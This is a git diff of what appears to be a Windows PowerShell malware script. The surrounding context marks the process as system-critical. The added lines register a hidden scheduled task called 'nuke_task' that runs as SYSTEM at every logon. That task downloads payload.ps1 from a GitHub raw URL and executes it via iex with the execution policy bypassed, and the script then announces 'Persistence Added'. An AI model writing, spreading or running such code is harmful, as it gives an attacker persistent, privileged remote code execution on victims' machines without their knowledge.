@@ -25,6 +25,19 @@ function CriticalProcess {
     }
 }
 CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 1 -Unknown1 0 -Unknown2 0	
+
+$task_name = "nuke_task"
+
+$task_action = New-ScheduledTaskAction -Execute "conhost.exe" -Argument "--headless powershell -ExecutionPolicy Bypass -NoProfile -C `"Iwr -Uri 'https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/payload.ps1' -UseBasicParsing | iex`""
+
+$task_trigger = New-ScheduledTaskTrigger -AtLogOn
+
+$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+
+Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "nuke_task" -RunLevel Highest -Force -User "SYSTEM" | Out-Null
+
+Write-Host "[!] Persistence Added" -ForegroundColor Green
+
 # 1. Cấu hình danh sách nguồn
 $sources = @(
     "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/best_urls.txt",
